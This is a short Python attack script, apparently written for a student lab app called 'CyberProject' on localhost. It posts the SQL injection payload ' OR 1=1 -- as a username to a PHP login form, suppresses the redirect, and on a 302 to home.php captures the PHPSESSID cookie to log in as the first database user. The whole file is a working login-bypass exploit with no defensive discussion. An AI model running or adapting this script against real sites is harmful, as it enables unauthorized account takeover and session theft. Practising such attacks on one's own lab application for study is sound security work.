import requests
target_url = "http://localhost/CyberProject/login.php"

payload_username = "' OR 1=1 -- "
payload_password = "anything_works"
#-----------------------------------------------

def sql_login_bypass(target_url="http://localhost/CyberProject/login.php", payload_username="' OR 1=1 -- ", payload_password="anything_works"):        
    #the data structure is consistent with the HTML form fields
    data = {
        "username": payload_username,
        "password": payload_password,
        "login_submit": "" # Send the submit button so PHP recognises the request.
    }

    print(f"[*] Attempting SQL Injection on {target_url}...")

    try:
        # after getting 302 (new address) we want to catch the 302 and not move to home,
        #so- allow_redirects=False
        response = requests.post(target_url, data=data, allow_redirects=False)

        
        if response.status_code == 302 and "home.php" in response.headers.get("Location", ""):
            session_id = response.cookies.get("PHPSESSID")
            print("[+] SUCCESS: SQL Injection Bypass Worked!")
            print(f"[+] Logged in as the first user in the database.")
            return session_id
        elif "Invalid username or password" in response.text:
            print("[-] FAILED: Injection was blocked or incorrect.")
        else:
            print("[?] UNKNOWN: Received unexpected response. Check manually.")

    except Exception as e:
        print(f"[!] Error: {e}")